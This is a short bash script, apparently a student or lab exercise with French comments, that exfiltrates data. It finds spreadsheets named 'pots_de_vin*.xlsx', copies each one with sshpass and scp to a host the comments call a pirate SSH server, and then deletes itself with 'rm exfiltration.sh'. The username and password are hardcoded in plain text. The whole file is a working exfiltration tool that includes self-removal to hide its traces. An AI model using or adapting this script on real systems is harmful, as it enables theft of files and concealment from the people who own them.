#!/bin/bash
username="etudiant"
password="vitrygtr"
Ip="177.16.1.4" # adresse de ssh-pirate

command=$(ls pots_de_vin*.xlsx)
for files in $command
do
    sshpass -p "$password" scp $files $username@$Ip:/home/etudiant/data
    echo $?
done

rm exfiltration.sh


# scp file1 file2 more-files* user@remote:/some/dir/

# sshpass -p vitrygtr scp pots_de_vin1.xlsx etudiant@177.16.1.4:/home/etudiant/data